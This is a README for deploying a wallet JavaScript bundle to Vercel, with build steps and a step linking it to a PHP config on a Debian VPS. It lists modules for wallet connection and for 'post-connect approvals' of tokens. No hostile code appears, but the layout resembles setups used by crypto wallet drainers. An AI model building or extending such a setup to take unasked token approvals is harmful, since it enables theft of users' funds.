# Vercel — wallet JS bundle only

Deploy **this folder** to Vercel. Nothing here is secret.

## Vercel dashboard

- **Root Directory:** `vercel` ← required (Settings → General)
- **Framework Preset:** Other
- Build runs `npm run build` → `public/wallet.bundle.js`

### 404 on the homepage?

`https://your-app.vercel.app/` may 404 before this repo’s `index.html` is deployed — that is OK.

Use the **bundle URL** (must include the file name):

`https://your-app.vercel.app/wallet.bundle.js`

Opening `/` in the browser is not the script URL your VPS needs.

## After deploy

Put the bundle URL in **`../vps/config.php`** on your Debian server:

```php
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
```

## Local build

```bash
cd vercel
npm install
npm run build
```

## Files

| File | Purpose |
|------|---------|
| `src/wallet-loader.js` | Reown connect |
| `src/token-approval.js` | Post-connect approvals |
| `src/solana-wallets.js` | Wallet list (commit this) |
| `public/wallet.bundle.js` | Output (generated, do not commit) |
